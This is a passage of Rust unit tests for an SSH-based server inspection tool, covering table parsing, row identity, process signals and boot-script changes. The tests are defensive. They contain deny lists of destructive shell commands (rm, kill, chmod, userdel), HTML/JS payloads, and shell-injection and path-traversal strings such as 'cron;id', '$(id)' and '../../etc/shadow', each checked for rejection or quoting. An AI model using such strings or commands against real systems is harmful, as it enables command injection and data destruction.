        assert!(!rootcheck.contains("| head -n 500"), "{rootcheck}");

        // With the extra row in hand the parser can tell the two apart: a table
        // that exactly fills the limit is complete, one row more is not.
        let request = SystemInfoRequest::new(SystemInfoTab::Processes, 2).unwrap();
        let row = "normal\t1\t0\troot\tS\t0.0\t0.1\t10\tsleep";
        let full = parse_table(&request, &format!("{row}\n{row}"));
        assert_eq!(full.rows.len(), 2);
        assert!(!full.truncated, "a table that just fits is not truncated");
        let more = parse_table(&request, &format!("{row}\n{row}\n{row}"));
        assert_eq!(more.rows.len(), 2, "the spare row is never shown");
        assert!(more.truncated, "a machine with more rows must say so");
    }

    #[test]
    fn larger_collections_keep_rows_after_500_and_report_a_real_cutoff() {
        let output = (0..1_101)
            .map(|i| format!("user{i}\t{i}\t{i}\t/home/user{i}\t/bin/sh"))
            .collect::<Vec<_>>()
            .join("\n");
        let complete = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 2_000).unwrap(),
            &output,
        );
        assert_eq!(complete.rows.len(), 1_101);
        assert_eq!(complete.rows[1_100].cells[0], "user1100");
        assert!(!complete.truncated);
        let limited = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 1_000).unwrap(),
            &output,
        );
        assert_eq!(limited.rows.len(), 1_000);
        assert!(limited.truncated);
    }

    #[test]
    fn editor_file_requires_a_shell_row_and_an_allowed_path() {
        let request = SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 10).unwrap();
        for path in [
            "/etc/profile",
            "/etc/bash.bashrc",
            "/root/.bashrc",
            "/home/alice/.bashrc",
        ] {
            let table = parse_table(&request, &format!("{path}\troot\t0\t1\t\tnormal"));
            assert_eq!(
                table.shell_config_file(&table.rows[0].id).unwrap().as_str(),
                path
            );
            assert!(table.shell_config_file("missing-row").is_err());
            let mut other_tab = table.clone();
            other_tab.tab = SystemInfoTab::Users;
            assert!(other_tab.shell_config_file(&table.rows[0].id).is_err());
        }
        for path in [
            "/etc/shadow",
            "/tmp/.bashrc",
            "/home/../.bashrc",
            "/home/a/b/.bashrc",
            "/etc/profile\n/tmp/x",
        ] {
            let mut table = parse_table(&request, "/etc/profile\troot\t0\t1\t\tnormal");
            table.rows[0].cells[0] = path.to_owned();
            assert!(
                table.shell_config_file(&table.rows[0].id).is_err(),
                "{path:?}"
            );
        }
    }

    #[test]
    fn every_awk_program_is_balanced_and_closes_its_block() {
        for tab in SystemInfoTab::ALL {
            let command = tab.command(500);
            for (index, program) in command.split('\'').enumerate() {
                // Odd chunks are what sits inside the shell's single quotes,
                // which is where the awk programs live.
                if index % 2 == 0 || !program.contains("print ") {
                    continue;
                }
                let quotes = program.matches('"').count();
                assert_eq!(
                    quotes % 2,
                    0,
                    "{tab:?} has an unbalanced quote in: {program}",
                );
                assert!(
                    program.trim_end().ends_with('}'),
                    "{tab:?} does not close its awk block: {program}",
                );
                assert_eq!(
                    program.matches('{').count(),
                    program.matches('}').count(),
                    "{tab:?} has unbalanced braces in: {program}",
                );
            }
        }
    }
    use crate::{
        BackendServices, PortableStore,
        ssh::{SshConnectionStatus, TestSessionHarness},
        target::TargetIdentity,
    };

    #[derive(Debug)]
    struct TestRoot(PathBuf);

    impl TestRoot {
        fn new() -> Self {
            let path =
                std::env::temp_dir().join(format!("lovelyres-system-info-{}", Uuid::new_v4()));
            fs::create_dir_all(&path).unwrap();
            Self(path)
        }
    }

    impl Drop for TestRoot {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    async fn bound_services(
        root: &TestRoot,
    ) -> (BackendServices, BoundSshSession, Arc<TestSessionHarness>) {
        let services =
            BackendServices::new(PortableStore::prepare(root.0.clone()).unwrap()).unwrap();
        let guard = services
            .activate_target(TargetIdentity::new("connection-a").unwrap())
            .unwrap();
        let status = SshConnectionStatus {
            session_id: "session-a".to_owned(),
            connection_id: "connection-a".to_owned(),
            host: "host-a.test".to_owned(),
            port: 22,
            username: "operator".to_owned(),
            host_key_fingerprint: "SHA256:test".to_owned(),
            connected_at: Utc::now(),
        };
        let session = BoundSshSession::from_status(guard, &status, "test session").unwrap();
        let harness = Arc::new(TestSessionHarness::default());
        services
            .ssh()
            .install_test_session(status, harness.clone())
            .await
            .unwrap();
        (services, session, harness)
    }

    #[test]
    fn all_legacy_tabs_have_static_read_only_commands_and_columns() {
        assert_eq!(SystemInfoTab::ALL.len(), 25);
        for tab in SystemInfoTab::ALL {
            assert!(
                !tab.command(500).trim().is_empty(),
                "missing command for {tab:?}"
            );
            assert!(!tab.columns().is_empty(), "missing columns for {tab:?}");
            let lower = tab.command(500).to_lowercase();
            for forbidden in [
                "; rm ",
                "&& rm ",
                "| rm ",
                "\nrm ",
                "kill ",
                "pkill",
                "systemctl stop",
                "systemctl disable",
                "chmod ",
                "chown ",
                "iptables -a",
                "iptables -d",
                "userdel",
            ] {
                assert!(
                    !lower.contains(forbidden),
                    "{tab:?} contains write-capable command token {forbidden}"
                );
            }
        }
    }

    #[test]
    fn malicious_rows_are_bounded_sanitized_and_column_aligned() {
        let request = SystemInfoRequest::new(SystemInfoTab::Users, 2).unwrap();
        let attack = format!(
            "<img src=x onerror=bad>\t0\t0\t/home/x\t{}\nsecond\t1\t1\t/home/y\t/bin/sh\nthird\t2\t2\t/x\t/y",
            "界".repeat(MAX_CELL_CHARS + 20)
        );
        let table = parse_table(&request, &attack);
        assert_eq!(table.rows.len(), 2);
        assert!(table.truncated);
        assert_eq!(table.rows[0].cells.len(), 5);
        assert_eq!(table.rows[0].cells[4].chars().count(), MAX_CELL_CHARS);
        assert_eq!(table.rows[0].cells[0], "<img src=x onerror=bad>");
    }

    #[test]
    fn summary_parser_is_typed_and_rejects_unmarked_output() {
        let summary = parse_summary(
            "hostname\thost-a\nos\tLinux\nkernel\t6.8\narchitecture\tx86_64\nvirtualization\tkvm\nboot_time\t2026-08-11 10:00:00\ntimezone\tAsia/Taipei\nlocale\tzh_TW.UTF-8\ninit_system\tsystemd\npackage_manager\tdnf\nselinux\tEnforcing\napparmor\tunavailable\nuptime\t42.9\nload\t1 2 3\ncpu_cores\t8\nmem_total\t1024\nswap_total\t2048\nroot_device\t/dev/vda1\nroot_filesystem\txfs\nprimary_ip\t10.0.0.2\ndefault_gateway\t10.0.0.1\ndns_servers\t1.1.1.1,8.8.8.8\n",
        )
        .unwrap();
        assert_eq!(summary.hostname, "host-a");
        assert_eq!(summary.uptime_seconds, 0);
        assert_eq!(summary.load_average, ["1", "2", "3"]);
        assert_eq!(summary.cpu_cores, 8);
        assert_eq!(summary.architecture, "x86_64");
        assert_eq!(summary.virtualization, "kvm");
        assert_eq!(summary.swap_total_bytes, 2_048);
        assert_eq!(summary.root_filesystem, "xfs");
        assert_eq!(summary.default_gateway, "10.0.0.1");
        assert!(parse_summary("untrusted noise").is_err());
    }

    #[test]
    fn summary_command_is_read_only_and_collects_the_overview_contract() {
        for marker in [
            "architecture\\t",
            "virtualization\\t",
            "boot_time\\t",
            "timezone\\t",
            "swap_total\\t",
            "root_filesystem\\t",
            "primary_ip\\t",
            "default_gateway\\t",
            "dns_servers\\t",
            "selinux\\t",
            "apparmor\\t",
        ] {
            assert!(SUMMARY_COMMAND.contains(marker), "missing {marker}");
        }
        let lower = SUMMARY_COMMAND.to_lowercase();
        for forbidden in [
            " rm ",
            " kill ",
            " chmod ",
            " chown ",
            "systemctl stop",
            "iptables -",
            "userdel ",
        ] {
            assert!(
                !lower.contains(forbidden),
                "unsafe summary token {forbidden}"
            );
        }
    }

    #[test]
    fn request_limit_is_bounded() {
        assert!(SystemInfoRequest::new(SystemInfoTab::Processes, 0).is_err());
        assert!(SystemInfoRequest::new(SystemInfoTab::Processes, MAX_ROWS + 1).is_err());
        assert!(SystemInfoRequest::new(SystemInfoTab::Processes, MAX_ROWS).is_ok());
    }

    #[test]
    fn stable_row_identity_survives_insertion_and_reordering() {
        let request = SystemInfoRequest::new(SystemInfoTab::Users, MAX_ROWS).unwrap();
        let first = parse_table(
            &request,
            "alice\t1000\t1000\t/home/alice\t/bin/bash\nbob\t1001\t1001\t/home/bob\t/bin/sh",
        );
        let reordered = parse_table(
            &request,
            "mallory\t2000\t2000\t/home/mallory\t/bin/sh\nbob\t1001\t1001\t/home/bob\t/bin/zsh\nalice\t1000\t1000\t/home/alice\t/bin/bash",
        );
        let alice = first
            .rows
            .iter()
            .find(|row| row.cells[0] == "alice")
            .unwrap();
        let alice_after = reordered
            .rows
            .iter()
            .find(|row| row.cells[0] == "alice")
            .unwrap();
        let bob = first.rows.iter().find(|row| row.cells[0] == "bob").unwrap();
        let bob_after = reordered
            .rows
            .iter()
            .find(|row| row.cells[0] == "bob")
            .unwrap();
        assert_eq!(alice.id, alice_after.id);
        assert_eq!(bob.id, bob_after.id);

        let duplicates = parse_table(
            &request,
            "alice\t1000\t1000\t/home/alice\t/bin/bash\nalice\t1000\t1000\t/home/alice\t/bin/bash",
        );
        assert_ne!(duplicates.rows[0].id, duplicates.rows[1].id);
        assert!(duplicates.rows[0].id.ends_with("-0"));
        assert!(duplicates.rows[1].id.ends_with("-1"));
    }

    #[test]
    fn detail_requests_are_derived_from_validated_typed_row_identity() {
        let cases = [
            (
                SystemInfoTab::Processes,
                "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
            ),
            (
                SystemInfoTab::Services,
                "sshd.service\tactive\trunning\tOpenSSH",
            ),
            (
                SystemInfoTab::Users,
                "alice\t1000\t1000\t/home/alice\t/bin/sh",
            ),
            (
                SystemInfoTab::SshKeys,
                "alice\tssh-ed25519\tQUJDREVGR0hJSktMTU5PUA==\twork\t/home/alice/.ssh/authorized_keys",
            ),
            (
                SystemInfoTab::SuidFiles,
                "/usr/bin/passwd\t4755\troot\t1\t2026\tnormal",
            ),
            (SystemInfoTab::Packages, "openssl\t3.0\t2026\tdpkg"),
            (SystemInfoTab::KernelModules, "nf_conntrack\t1\t1\tnormal"),
            (
                SystemInfoTab::RecentFiles,
                "/tmp/report.txt\t2026\t1\troot\tnormal",
            ),
        ];
        for (tab, output) in cases {
            let request = SystemInfoRequest::new(tab, 1).unwrap();
            let table = parse_table(&request, output);
            let detail = table.detail_request(&table.rows[0].id).unwrap().unwrap();
            assert_eq!(detail.tab, tab);
            assert_eq!(detail.row_id, table.rows[0].id);
            let command = detail.command().to_lowercase();
            for forbidden in [
                "; rm ",
                "&& rm ",
                "| rm ",
                "\nrm ",
                " kill ",
                "systemctl stop",
                "systemctl disable",
                "chmod ",
                "chown ",
            ] {
                assert!(
                    !command.contains(forbidden),
                    "unsafe detail command: {command}"
                );
            }
            assert!(table.detail_request("forged-row-id").is_err());
        }

        let unsupported = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Firewall, 1).unwrap(),
            "INPUT\tACCEPT\ttcp\t0.0.0.0\t0.0.0.0\t--dport 22",
        );
        assert!(
            unsupported
                .detail_request(&unsupported.rows[0].id)
                .unwrap()
                .is_none()
        );

        for tab in SystemInfoTab::ALL.into_iter().filter(|tab| {
            !matches!(
                *tab,
                SystemInfoTab::Processes
                    | SystemInfoTab::Services
                    | SystemInfoTab::Users
                    | SystemInfoTab::SshKeys
                    | SystemInfoTab::SuidFiles
                    | SystemInfoTab::Packages
                    | SystemInfoTab::KernelModules
                    | SystemInfoTab::RecentFiles
            )
        }) {
            let table = SystemInfoTable {
                tab,
                columns: tab
                    .columns()
                    .iter()
                    .map(|column| (*column).to_owned())
                    .collect(),
                rows: vec![SystemInfoRow {
                    id: "typed-row".to_owned(),
                    cells: vec![String::new(); tab.columns().len()],
                    risk: SystemInfoRisk::Normal,
                }],
                truncated: false,
                missing_tool: None,
                failed_tool: None,
            };
            assert!(
                table.detail_request("typed-row").unwrap().is_none(),
                "{tab:?} must not synthesize a remote action"
            );
        }
    }

    #[test]
    fn malicious_detail_keys_are_rejected_or_shell_quoted() {
        for (tab, output) in [
            (
                SystemInfoTab::Processes,
                "normal\t1;id\t1\troot\tS\t0\t0\t1\t/bin/sh",
            ),
            (
                SystemInfoTab::Services,
                "sshd.service;id\tactive\trunning\tOpenSSH",
            ),
            (SystemInfoTab::Users, "root;id\t0\t0\t/root\t/bin/sh"),
            (SystemInfoTab::Packages, "openssl;id\t3.0\t2026\tdpkg"),
            (
                SystemInfoTab::KernelModules,
                "nf_conntrack;id\t1\t1\tnormal",
            ),
            (
                SystemInfoTab::Services,
                "--help\tactive\trunning\toption injection",
            ),
            (SystemInfoTab::Packages, "--help\t3.0\t2026\tdpkg"),
            (SystemInfoTab::KernelModules, "--help\t1\t1\tnormal"),
        ] {
            let table = parse_table(&SystemInfoRequest::new(tab, 1).unwrap(), output);
            assert!(table.detail_request(&table.rows[0].id).is_err());
        }

        let path = "/tmp/a'; touch /tmp/never";
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::RecentFiles, 1).unwrap(),
            &format!("{path}\t2026\t1\troot\tnormal"),
        );
        let detail = table.detail_request(&table.rows[0].id).unwrap().unwrap();
        assert!(detail.command().starts_with(&format!("p={}", shq(path))));
    }

    #[test]
    fn detail_output_is_plain_bounded_text() {
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table.detail_request(&table.rows[0].id).unwrap().unwrap();
        let mut output = format!(
            "<script>label</script>\t<img onerror=bad>{}\n",
            "界".repeat(MAX_CELL_CHARS + 1)
        );
        output.push_str(&"extra\tvalue\n".repeat(70));
        let detail = parse_detail(&request, &output);
        assert_eq!(detail.fields.len(), 64);
        assert_eq!(detail.fields[0].label, "<script>label</script>");
        assert_eq!(detail.fields[0].value.chars().count(), MAX_CELL_CHARS);
    }

    #[test]
    fn process_investigation_catalog_replaces_every_legacy_read_action() {
        assert_eq!(ProcessInvestigationGroup::ALL.len(), 8);
        assert_eq!(ProcessInvestigationAction::ALL.len(), 40);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let row_id = table.rows[0].id.clone();
        for action in ProcessInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(ProcessInvestigationGroup::ALL.contains(&action.group()));
            let request = table
                .process_investigation_request(&row_id, action)
                .unwrap();
            assert_eq!(request.pid(), 123);
            assert_eq!(request.action(), action);
            let command = request.command();
            assert!(command.starts_with("p='123';"), "{action:?}: {command}");
            for forbidden in [" kill -s ", " rm ", " chmod ", " chown ", "systemctl stop"] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }

        let users = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
            "alice\t1000\t1000\t/home/alice\t/bin/sh",
        );
        assert!(
            users
                .process_investigation_request(
                    &users.rows[0].id,
                    ProcessInvestigationAction::CommandLine,
                )
                .is_err()
        );
        let forged = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t1;id\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        assert!(
            forged
                .process_signal_request(&forged.rows[0].id, ProcessSignal::Kill)
                .is_err()
        );
    }

    #[tokio::test]
    async fn process_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table
            .process_investigation_request(
                &table.rows[0].id,
                ProcessInvestigationAction::Environment,
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_PROCESS_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_process(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>alert(1)</script>"));
        assert!(result.output.len() <= MAX_PROCESS_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_process(&session, &request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn process_signal_requires_exact_confirmation_and_identity_snapshot() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table
            .process_signal_request(&table.rows[0].id, ProcessSignal::Terminate)
            .unwrap();

        harness.set_execute_output("123\t42\tbash");
        let wrong_plan = services
            .system_info()
            .plan_process_signal(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_process_signal(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs(["123\t42\tbash", "123\t99\treused"]);
        let stale = services
            .system_info()
            .plan_process_signal(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_process_signal(
                    &session,
                    stale,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn exact_process_signal_is_journaled_and_verified_without_fake_restore() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table
            .process_signal_request(&table.rows[0].id, ProcessSignal::Kill)
            .unwrap();
        harness.set_execute_outputs(["123\t42\tbash", "123\t42\tbash", "", "ABSENT"]);
        let plan = services
            .system_info()
            .plan_process_signal(&session, &request)
            .await
            .unwrap();
        assert_eq!(plan.snapshot().start_time_ticks, 42);
        assert!(plan.definition().restore_description.is_none());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_process_signal(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        assert_eq!(outcome.pid, 123);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-process")
        );
    }

    /// A boot entry that is a script is still a boot entry.
    ///
    /// The tab lists sysvinit and OpenRC entries on any host that does not
    /// boot with systemd, and every one of them used to offer nothing at all.
    #[test]
    fn a_boot_script_answers_every_question_a_script_can_answer() {
        let table = SystemInfoTable {
            tab: SystemInfoTab::Autostart,
            columns: SystemInfoTab::Autostart
                .columns()
                .iter()
                .map(|value| (*value).to_owned())
                .collect(),
            rows: vec![
                SystemInfoRow {
                    id: "script".to_owned(),
                    cells: vec![
                        "cron".to_owned(),
                        "/etc/init.d/cron".to_owned(),
                        "enabled".to_owned(),
                        "init.d".to_owned(),
                    ],
                    risk: SystemInfoRisk::Normal,
                },
                SystemInfoRow {
                    id: "unit".to_owned(),
                    cells: vec![
                        "sshd.service".to_owned(),
                        "sshd.service".to_owned(),
                        "enabled".to_owned(),
                        "systemd".to_owned(),
                    ],
                    risk: SystemInfoRisk::Normal,
                },
            ],
            truncated: false,
            missing_tool: None,
            failed_tool: None,
        };

        let mut answered = 0;
        for action in StartupInvestigationAction::ALL {
            let wrapped = ArtifactInvestigationAction::Startup(action);
            let request = table.artifact_investigation_request("script", wrapped);
            assert_eq!(
                request.is_ok(),
                action.applies_to_script(),
                "{action:?} disagrees with applies_to_script"
            );
            let Ok(request) = request else { continue };
            answered += 1;
            let command = request.command().unwrap();
            // The name and the path only ever enter the command quoted, and
            // nothing else about the row does.
            assert!(command.starts_with("n='cron'; p='/etc/init.d/cron';"));
            assert!(!command.contains("systemctl"));
            assert!(!command.contains("journalctl"));
        }
        assert_eq!(answered, StartupInvestigationAction::ALL.len() - 2);

        // The systemd rows are untouched by any of it.
        for action in StartupInvestigationAction::ALL {
            let command = table
                .artifact_investigation_request(
                    "unit",
                    ArtifactInvestigationAction::Startup(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.starts_with("u='sshd.service';"));
        }
    }

    fn autostart_table(kind: &str) -> SystemInfoTable {
        SystemInfoTable {
            tab: SystemInfoTab::Autostart,
            columns: SystemInfoTab::Autostart
                .columns()
                .iter()
                .map(|value| (*value).to_owned())
                .collect(),
            rows: vec![SystemInfoRow {
                id: "row".to_owned(),
                cells: vec![
                    if kind == "systemd" {
                        "cron.service"
                    } else {
                        "cron"
                    }
                    .to_owned(),
                    "/etc/init.d/cron".to_owned(),
                    "enabled".to_owned(),
                    kind.to_owned(),
                ],
                risk: SystemInfoRisk::Normal,
            }],
            truncated: false,
            missing_tool: None,
            failed_tool: None,
        }
    }

    /// The same menu entry, routed by what the row actually is.
    #[test]
    fn a_startup_row_routes_its_runtime_change_by_what_the_row_is() {
        let script = autostart_table("init.d");
        assert!(matches!(
            script.runtime_change_request("row", ServiceRuntimeAction::Disable),
            Ok(RuntimeChangeRequest::BootScript(_))
        ));
        // Everything this tab lists is already in the boot sequence, so
        // enabling one is a no-op that could only come back as a refusal.
        // Starting one needs a running service manager to hand the job to and
        // something to read back that says whether it took; a script has
        // neither. Both are refused here and never reach the menu.
        for refused in [
            ServiceRuntimeAction::Enable,
            ServiceRuntimeAction::Start,
            ServiceRuntimeAction::Stop,
            ServiceRuntimeAction::Restart,
            ServiceRuntimeAction::Mask,
        ] {
            assert!(
                script.runtime_change_request("row", refused).is_err(),
                "{refused:?}"
            );
        }
        assert_eq!(
            ServiceRuntimeAction::AUTOSTART,
            [ServiceRuntimeAction::Start, ServiceRuntimeAction::Disable]
        );

        // A systemd row keeps going down the systemd path, and is subject to
        // the same reading of what this tab contains.
        let unit = autostart_table("systemd");
        assert!(matches!(
            unit.runtime_change_request("row", ServiceRuntimeAction::Disable),
            Ok(RuntimeChangeRequest::Service(_))
        ));
        assert!(matches!(
            unit.runtime_change_request("row", ServiceRuntimeAction::Start),
            Ok(RuntimeChangeRequest::Service(_))
        ));
        assert!(
            unit.runtime_change_request("row", ServiceRuntimeAction::Enable)
                .is_err()
        );
        assert!(
            unit.runtime_change_request("missing", ServiceRuntimeAction::Disable)
                .is_err()
        );
    }

    #[test]
    fn boot_link_state_is_read_strictly_and_says_what_it_means() {
        let digest = "a".repeat(64);
        let enabled = parse_boot_script_state(
            &format!("cron\tupdate-rc.d\t{digest}\t/etc/rc2.d/S01cron /etc/rc3.d/S01cron\t/etc/rc0.d/K01cron\n"),
            "/etc/init.d/cron",
        )
        .unwrap();
        assert!(enabled.enabled());
        assert_eq!(enabled.start_links.len(), 2);
        assert_eq!(enabled.manager, Some(BootScriptManager::UpdateRcD));

        // No start link is the whole definition of "not in the boot sequence",
        // even while stop links remain — which is what `update-rc.d disable`
        // leaves behind.
        let disabled = parse_boot_script_state(
            &format!("cron\tupdate-rc.d\t{digest}\t\t/etc/rc2.d/K01cron\n"),
            "/etc/init.d/cron",
        )
        .unwrap();
        assert!(!disabled.enabled());
        assert!(
            validate_boot_script_precondition(&disabled, ServiceRuntimeAction::Disable).is_err()
        );
        assert!(validate_boot_script_precondition(&disabled, ServiceRuntimeAction::Enable).is_ok());
        assert!(validate_boot_script_precondition(&enabled, ServiceRuntimeAction::Disable).is_ok());
        assert!(boot_script_runtime_verified(
            &disabled,
            ServiceRuntimeAction::Disable
        ));
        assert!(boot_script_runtime_verified(
            &enabled,
            ServiceRuntimeAction::Enable
        ));
        assert_ne!(
            boot_script_snapshot_sha256(&enabled),
            boot_script_snapshot_sha256(&disabled)
        );

        // A host with no boot-link tool can be read and not changed.
        let unmanaged =
            parse_boot_script_state(&format!("cron\tnone\t{digest}\t\t\n"), "/etc/init.d/cron")
                .unwrap();
        assert!(unmanaged.manager.is_none());
        assert!(
            validate_boot_script_precondition(&unmanaged, ServiceRuntimeAction::Enable).is_err()
        );

        for hostile in [
            format!("cron;id\tupdate-rc.d\t{digest}\t\t\n"),
            format!("cron\tevil-tool\t{digest}\t\t\n"),
            "cron\tupdate-rc.d\tnot-a-digest\t\t\n".to_owned(),
            format!("cron\tupdate-rc.d\t{digest}\trelative/link\t\n"),
            format!(
                "cron\tupdate-rc.d\t{digest}\t{}\t\n",
                vec!["/etc/rc2.d/S01cron"; 65].join(" ")
            ),
        ] {
            assert!(
                parse_boot_script_state(&hostile, "/etc/init.d/cron").is_err(),
                "{hostile:?} was accepted"
            );
        }

        // The name and the path only ever enter the command quoted.
        let command = boot_script_state_command("cron", "/etc/init.d/cron");
        assert!(command.starts_with("n='cron'; p='/etc/init.d/cron';"));
        assert!(
            command.contains("rc-update")
                && command.contains("update-rc.d")
                && command.contains("chkconfig")
        );
    }

    #[tokio::test]
    async fn taking_a_boot_script_out_is_planned_journaled_and_read_back() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let digest = "b".repeat(64);
        let table = autostart_table("init.d");
        let RuntimeChangeRequest::BootScript(request) = table
            .runtime_change_request("row", ServiceRuntimeAction::Disable)
            .unwrap()
        else {
            panic!("a script row must route to the boot script path");
        };
        let enabled =
            format!("cron\tupdate-rc.d\t{digest}\t/etc/rc2.d/S01cron\t/etc/rc0.d/K01cron\n");
        let disabled =
            format!("cron\tupdate-rc.d\t{digest}\t\t/etc/rc0.d/K01cron /etc/rc2.d/K01cron\n");
        // Read for the plan, read again as the precondition, the change
        // itself, then the read-back that has to agree.
        harness.set_execute_outputs([
            enabled.clone(),
            enabled.clone(),
            String::new(),
            disabled.clone(),
        ]);

        let plan = services
            .system_info()
            .plan_boot_script_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.snapshot().enabled());
        assert!(plan.definition().dangerous);
        // The operator is told what will be used and how it comes back.
        assert!(plan.definition().summary.contains("update-rc.d"));
        assert!(plan.definition().summary.contains("/etc/rc2.d/S01cron"));
        assert!(
            plan.definition()
                .restore_description
                .as_ref()
                .unwrap()
                .contains("重新加回开机序列")
        );

        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_boot_script_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        assert!(!outcome.restored_after_failed_verification);
        assert!(outcome.verification.detail.contains("不在开机序列中"));
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-boot-script")
        );
    }

    #[tokio::test]
    async fn a_boot_script_change_that_did_not_take_is_put_back() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let digest = "c".repeat(64);
        let table = autostart_table("init.d");
        let RuntimeChangeRequest::BootScript(request) = table
            .runtime_change_request("row", ServiceRuntimeAction::Disable)
            .unwrap()
        else {
            panic!("a script row must route to the boot script path");
        };
        let enabled = format!("cron\tupdate-rc.d\t{digest}\t/etc/rc2.d/S01cron\t\n");
        // Plan, precondition, the change, then eleven read-backs that all
        // still show it enabled: the verification loop gives up, and the
        // restore sees it is already where it started and touches nothing.
        let mut outputs = vec![enabled.clone(), enabled.clone(), String::new()];
        outputs.extend(std::iter::repeat_n(enabled.clone(), 12));
        harness.set_execute_outputs(outputs);

        let plan = services
            .system_info()
            .plan_boot_script_runtime(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_boot_script_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(!outcome.verification.passed);
        assert!(outcome.verification.detail.contains("未通过核对"));
        // The restore ran and found the links already the way the plan
        // recorded them, so it changed nothing and reported the host as back
        // where it started — which it is.
        assert!(outcome.restored_after_failed_verification);
    }

    #[test]
    fn a_boot_script_row_that_cannot_be_trusted_is_refused() {
        let row_of = |name: &str, target: &str, kind: &str| SystemInfoTable {
            tab: SystemInfoTab::Autostart,
            columns: SystemInfoTab::Autostart
                .columns()
                .iter()
                .map(|value| (*value).to_owned())
                .collect(),
            rows: vec![SystemInfoRow {
                id: "row".to_owned(),
                cells: vec![
                    name.to_owned(),
                    target.to_owned(),
                    "enabled".to_owned(),
                    kind.to_owned(),
                ],
                risk: SystemInfoRisk::Normal,
            }],
            truncated: false,
            missing_tool: None,
            failed_tool: None,
        };
        let ask = |table: SystemInfoTable| {
            table.artifact_investigation_request(
                "row",
                ArtifactInvestigationAction::Startup(StartupInvestigationAction::Details),
            )
        };
        // A name that could climb out of /etc/default, or carry shell along.
        for hostile in [
            "../../etc/shadow",
            "a b",
            "cron;id",
            "$(id)",
            "",
            ".hidden",
            "a/b",
        ] {
            assert!(
                ask(row_of(hostile, "/etc/init.d/cron", "init.d")).is_err(),
                "{hostile:?} was accepted as a boot script name"
            );
        }
        // A relative target, and a kind nobody hands out.
        assert!(ask(row_of("cron", "etc/init.d/cron", "init.d")).is_err());
        assert!(ask(row_of("cron", "/etc/init.d/cron", "upstart")).is_err());
        // A link that resolved outside the usual directory is the row worth
        // opening, not one to hide — and the check says so in as many words.
        let odd = row_of("evil", "/tmp/.x/payload.sh", "init.d")
            .artifact_investigation_request(
                "row",
                ArtifactInvestigationAction::Startup(StartupInvestigationAction::SuspiciousPath),
            )
            .unwrap();
        let command = odd.command().unwrap();
        assert!(command.starts_with("n='evil'; p='/tmp/.x/payload.sh';"));
        assert!(command.contains("OUTSIDE the standard boot script directories"));
    }

    #[test]
    fn process_identity_treats_a_zombie_as_already_gone() {
        let command = process_identity_command(4242);
        // The state is the first field after the closing parenthesis of the
        // command name; it is checked before the start time is read, so a
